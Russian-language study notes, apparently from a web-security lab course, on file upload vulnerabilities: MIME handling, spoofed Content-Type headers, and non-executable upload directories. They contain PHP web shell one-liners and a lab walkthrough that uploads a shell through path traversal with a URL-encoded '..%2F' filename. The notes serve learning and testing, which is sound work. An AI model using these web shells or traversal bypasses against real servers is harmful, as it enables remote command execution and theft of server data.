> [!info] 
> На обычных веб сайтах редко встречаются какие либо ограничения на то какие файлы разрешено загружать пользователям, чаще всего разработчики внедряют то что они считают надежной проверкой, которая либо изначально содержит недостатки либо может быть легко обманута

**Пример:**
Разработчик может внести в черный список опасные типы файлов, но можно легко пропустить более непонятные типы файлов которые все еще могут представлять опасность

Так же веб приложение может проверить тип файла, проверяя свойства, которыми злоумышленник может легко манипулировать с помощью Burp или Caido

Даже самые надежные меры могут применяться не согласованно во всей сети хостингов и каталогов, составляющих вебсайт что приводит к расхождениям которыми можно пользоваться 

#### Как веб-сервера обрабатывают запросы к статическим файлам
Когда клиент (например, браузер) делает HTTP-запрос к серверу, сервер:
- Сначала **анализирует путь (path) файла** в запросе.
- Извлекает **расширение файла** (`.html`, `.php`, `.jpg` и т. д.).
- Использует **преднастроенную таблицу соответствия расширений и MIME-типов** (например, `.html` → `text/html`, `.jpg` → `image/jpeg`, `.php` → `application/x-httpd-php`)
Далее от типа файла и конфигурации сервера делится на исполняемые и неисполняемые
	**Неисполняемые файлы:**
		Пример: `.html`, `.css`, `.jpg`, `.png`
		Если считается неисполняемым то читает файл и отправляет его клиенту как есть в HTTP ответе
	**Исполняемые файлы**
		Пример: `.php`, `.cgi`, `.jsp`, `.asp`
		Если сервер настроен выполнять такие файлы, то он устанавливает переменный окружения(например из query-параметров и заголовков запроса) 
		Запускает скрипт
		Отправляет клиенту результат выполнения скрипта 
	**Ошибочная обработка исполняемых файлов**
		Если сервер не настроен правильно для выполнения исполняемых файлов
		Он может отдать содержимое как текст, заместо его исполнения, это утечка исходного кода, которая является уязвимостью, называется `Infornation Disclousure` (раскрытие информации)

> [!note] Заголовок Content-Type
> Заголовок показывает в ответе сервера, какой тип файла(MIME-type) был отправлен
> Если сервер сам не указывал его вручную то он будет выставлен автоматически на основе расширения файла
```HTTP
Пример:
Content-Type: text/html
или
Content-Type: application/x-httpd-php
```

#### Некорректная валидация типа файла - Flawed file type Validation
Когда мы загружаем файл через `HTML`  форму например изображение, то браузер отправляет запрос в формате `multipart/form-data` это разбивает тело запроса на части где каждая часть представляет одно поле формы, то есть, файл текст и т.д.
В уязвимой системе сервер доверяет `Content-Type` указанному в `multipart-запросе` вместо того чтобы самому проверить содержимое файла, это позволяет злоумышленнику обмануть сервер загрузив вредоносный файл и это позволяет злоумышленнику обмануть сервер загрузи вредоносный файл
Пример
```HTTP
POST /images HTTP/1.1
Host: normal-website.com
Content-Length: 12345 
Content-Type: multipart/form-data;
boundary=-012345678901234567890123456 ---------012345678901234567890123456
Content-Disposition: form-data; name="image"; filename="example.jpg"
Content-Type: image/jpeg 
[...binary content of example.jpg...]
 ----------012345678901234567890123456
Content-Disposition: form-data; name="description"
This is an interesting description of my image. ---------------------------012345678901234567890123456
Content-Disposition: form-data; name="username"
 wiener
---------------------------012345678901234567890123456--
```

По факту если переименовать PHP-скрипт в `.jpg` установить `Content-Type: image/jpeg` загрузить вебшел файл и если сервер не проверяет содержимое и каталог загрузки является исполняемым то злоумышленник получит `RCE`

#### Использование загрузки файлов для развертывания web-shell с заменой типа файла

> [!note] Web-Shell
>Это скрипт который позволяет исполнять произвольные команды, через HTTP запросы
>При успешной загрузке оболочки мы получаем полный контроль над сервером в рамках того пользователя от которого запущен доступ

> [!exploit] Примеры эксплоитов
```
<?php echo file_get_contents('/путь/к/целевому/файлу'); ?> - позвлит получить содержимое целевого файла
==========================
<?php echo system($_GET['command']); ?> - позволяет передать системную команду через HTTP для ее исполнения на сервере
GET /example/exploit.php?command=id HTTP/1.1 - так будет выглядеть пример запроса
```

#### Предотвращение исполнения файлов в каталогах доступных пользователю

В качестве меры предосторожности используют  только те скрипты MIME-тип которых был явно настроен для выполнения, в противном случае они либо выдают ошибку либо просто вывести содержимое файла

> [!info] Пример
```HTTP
GET /static/exploit.php?command=id HTTP/1.1 
Host: normal-website.com 

HTTP/1.1 200 OK 
Content-Type: text/plain 
Content-Length: 39 

<?php echo system($_GET['command']); ?>
```

Такое поведение может привести к утечке исходного кода, но сводит на нет любые попытки создать `web-shell`. Такой тип конфигурации часто разный между директориями, то есть в директории в которую пользователь может загружать файлы имеет более строгий контроль чем другие директории в файловой системе, отсюда рождается идея что если загрузить файл в другую директорию то сервер сможет исполнить ваш скрипт

> [!tip] Обрати внимание!
> Веб серверы используют поле имени  файла в multipart/form-data в запросах для определения имени и места где файл должен быть сохранен

> [!warning] ВАЖНО!
>Хотя мы отправляем наши запросы на одно доменное имя это часто указывает на какой либо прокси сервер, такой как балансировщик нагрузки и запросы могут обрабатываться разными серверами которые могут быть настроены по разному!

#### Пример обхода пути
В лабораторной работе необходимо загрузить файл в другую директорию и забрать секрет, я буду создавать веб шел для начала просто заменим в запросе имя на `../shell.php` потому что файл который мы загружаем загружается в `files/avatars/` и при этом папка не исполняемая, пробуем `../shell.php` 
```
POST /my-account/avatar HTTP/1.1
...
------WebKitFormBoundarydnQowihfAQAhUbBV
Content-Disposition: form-data; name="avatar"; filename="../shell.php"
Content-Type: application/x-php
...


HTTP/1.1 200 OK
...
The file avatars/shell.php has been uploaded.
```
получили то что сервер чистит имя файла от странных символов которые позволяют загрузить файл в другое место, попробуем закодировать в URL
```
POST /my-account/avatar HTTP/1.1
...
------WebKitFormBoundarydnQowihfAQAhUbBV
Content-Disposition: form-data; name="avatar"; filename="..%2Fshell.php"
Content-Type: application/x-php
...


HTTP/1.1 200 OK
...
The file avatars/../shell.php has been uploaded.
```
в этом случае мы уже загрузили наш файл на каталог выше, тогда делаем `GET` до пути нашего файла в моем случае это `/files/shell.php`(потому что-то путь до основной папки выглядит следующим образом: `/files/avatars/Photo` )  и получаем наш `web-shell`
